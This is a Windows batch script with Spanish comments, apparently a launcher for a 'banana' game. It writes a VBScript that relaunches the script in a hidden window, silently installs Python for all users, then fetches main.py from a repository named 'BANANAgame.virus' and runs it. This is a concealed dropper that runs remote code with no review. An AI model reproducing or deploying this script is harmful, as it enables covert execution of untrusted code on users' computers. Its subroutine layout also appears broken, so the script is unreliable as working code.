@echo off

:: Crea el archivo VBScript para ejecutar el BAT de manera oculta
echo Set objShell = CreateObject("WScript.Shell") > run_hidden.vbs
echo objShell.Run "cmd /c run_game.bat run_hidden", 0, False >> run_hidden.vbs

:: Ejecuta el archivo VBScript y luego sale si no está siendo llamado por VBScript
if "%1" neq "run_hidden" (
    cscript //nologo run_hidden.vbs
    exit /b
)

:: Aquí empieza el verdadero contenido del BAT que se ejecutará de manera oculta

:: Verifica si Python está instalado
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python no está instalado. Descargando e instalando Python...

    :: URL del instalador de Python (puedes cambiar la versión si es necesario)
    set PYTHON_INSTALLER_URL=https://www.python.org/ftp/python/3.10.9/python-3.10.9-amd64.exe

    :: Nombre del instalador
    set PYTHON_INSTALLER=python_installer.exe

    :: Descargar el instalador de Python
    echo Descargando instalador de Python desde %PYTHON_INSTALLER_URL%...
    curl -o %PYTHON_INSTALLER% %PYTHON_INSTALLER_URL%
    if %errorlevel% neq 0 (
        echo curl no está instalado. Intentando con wget...
        wget -O %PYTHON_INSTALLER% %PYTHON_INSTALLER_URL%
        if %errorlevel% neq 0 (
            echo wget no está instalado. Por favor, descarga e instala Python manualmente desde %PYTHON_INSTALLER_URL%
            pause
            exit /b
        )
    )

    :: Ejecutar el instalador de Python en modo silencioso
    echo Instalando Python...
    %PYTHON_INSTALLER% /quiet InstallAllUsers=1 PrependPath=1
    if %errorlevel% neq 0 (
        echo La instalación de Python falló. Por favor, instala Python manualmente.
        pause
        exit /b
    )

    :: Limpieza: elimina el instalador de Python
    del %PYTHON_INSTALLER%
)

:: URLs de los archivos en GitHub
set URL_PYTHON=https://raw.githubusercontent.com/Aristonteles/BANANAgame.virus/main/main.py
set URL_BANANA=https://raw.githubusercontent.com/Aristonteles/BANANAgame.virus/main/banana1.png
set URL_BOMB=https://raw.githubusercontent.com/Aristonteles/BANANAgame.virus/main/bomb.png

:: Nombres de los archivos
set FILE_PYTHON=main.py
set FILE_BANANA=banana1.png
set FILE_BOMB=bomb.png

:: Función para descargar archivos
:download_file
if not exist %2 (
    echo %2 no encontrado. Descargando desde GitHub...
    curl -o %2 %1
    if %errorlevel% neq 0 (
        echo curl no está instalado. Intentando con wget...
        wget -O %2 %1
        if %errorlevel% neq 0 (
            echo wget no está instalado. Por favor, descarga el archivo manualmente desde %1
            pause
            exit /b
        )
    )
)
goto :eof

:: Descarga los archivos si no existen
call :download_file %URL_PYTHON% %FILE_PYTHON%
call :download_file %URL_BANANA% %FILE_BANANA%
call :download_file %URL_BOMB% %FILE_BOMB%

:: Ejecuta el script de Python
python main.py
pause

